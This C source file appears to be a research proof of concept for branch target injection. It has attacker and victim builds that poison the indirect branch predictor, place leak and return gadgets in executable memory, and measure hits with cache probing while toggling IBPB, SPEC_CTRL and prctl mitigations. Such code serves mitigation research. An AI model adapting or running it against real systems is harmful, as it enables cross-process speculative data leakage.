#include "utils.h"
#include <stdio.h>
#include <string.h>
#include <sys/prctl.h>

#ifndef PRINT_AMMOUNT
#define PRINT_AMMOUNT 1000
#endif

#define IA32_SPEC_CTRL 72

uint8_t *rdiPtr;
uint8_t unused[0x500];
uint8_t probeArray[0x1000] = {2};
uint8_t unuse2[0x500];

uint32_t f1() {}

int poison(uint8_t *srcAddress, uint8_t *dstAddress, uint64_t cpu)
{
    volatile uint8_t d;

    unsigned tries = 0;
    unsigned hits = 0;
    unsigned totalHits = 0;
    unsigned totalTries = 0;

    jitForLoop(srcAddress);

    while (1)
    {

#ifndef VICTIM
        callGadget(srcAddress, (uint8_t *)&rdiPtr, (uint8_t *)probeArray);
        continue;
#else

#ifdef IBPB
        wrmsr_on_cpu(73, cpu, 1);
#endif
        for (int i = 0; i < 100; i++)
        {
            d = *dstAddress;
            flush((uint8_t *)&rdiPtr);
            callGadget(srcAddress, (uint8_t *)&rdiPtr, (uint8_t *)probeArray);
        }

        if (probe(&probeArray[0]) < THRESHOLD)
        {
            hits++;
            totalHits++;
        }

        totalTries++;
        if (++tries % PRINT_AMMOUNT == 0)
        {

            printf("Rate: %u/%u  MSR[72]=%d\n", hits, tries,rdmsr_on_cpu(IA32_SPEC_CTRL,cpu));
            #ifdef MSR
            wrmsr_on_cpu(IA32_SPEC_CTRL, cpu, MSR_VAL);
            #endif
            tries = 0;
            hits = 0;
            if (totalTries >= PRINT_AMMOUNT * 10)
            {
                break;
            }
        }
        usleep(1);

#endif
    }

    printf("Total misspredict rate: %d/%d (%.2f %)\n", totalHits, totalTries, (float)totalHits * 100 / (float)totalTries);
}

int main(int argc, char **argv)
{

    uint64_t srcAddress;
    uint64_t dstAddress;
    uint64_t cpu;

    if (argc < 4)
    {
        printf("Usage:   %s <srcAddress> <dstAddress> <cpuCore> \n", argv[0]);
        printf("Example: %s 0x55555554123 0x55555555345 1 \n", argv[0]);
        return 0;
    }

    srcAddress = (uint64_t)strtoull(argv[1], NULL, 16);
    dstAddress = (uint64_t)strtoull(argv[2], NULL, 16);
    cpu = (uint64_t)strtoull(argv[3], NULL, 16);
    SetCoreAffinity(cpu);

    uint8_t *rwx1 = requestMem((uint8_t *)(srcAddress & (~0xfffULL)), 0x1000);
    uint8_t *rwx2 = requestMem((uint8_t *)(dstAddress & (~0xfffULL)), 0x1000);

#ifdef PRCTL
    if (prctl(PR_SET_SPECULATION_CTRL, PR_SPEC_INDIRECT_BRANCH, PR_SPEC_FORCE_DISABLE, 0, 0) != 0)
    {
        perror("prctl");
    }
    printf("PRCTL GET value 0x%x\n", prctl(PR_GET_SPECULATION_CTRL, PR_SPEC_INDIRECT_BRANCH, 0, 0, 0));
#endif

#ifdef MSR
    printf("current value msr[%d]=%d on core %d\n", IA32_SPEC_CTRL, rdmsr_on_cpu(IA32_SPEC_CTRL, cpu), cpu);
    wrmsr_on_cpu(IA32_SPEC_CTRL, cpu, MSR_VAL);
    printf("writing msr[%d]=%d on core %d \n", IA32_SPEC_CTRL, MSR_VAL, cpu);
    printf("current value msr[%d]=%d on core %d\n", IA32_SPEC_CTRL, rdmsr_on_cpu(IA32_SPEC_CTRL, cpu), cpu);
#endif

// set up leak gadget into position
#ifdef VICTIM
    rdiPtr = (uint8_t *)f1;
    copyLeakGadget(dstAddress);
#else
    rdiPtr = (uint8_t *)dstAddress;
    copyRetGadget(dstAddress);
#endif

    poison(srcAddress, dstAddress, cpu);

#ifdef MSR
    printf("current value msr[%d]=%d on core %d\n", IA32_SPEC_CTRL, rdmsr_on_cpu(IA32_SPEC_CTRL, cpu), cpu);
#endif
}
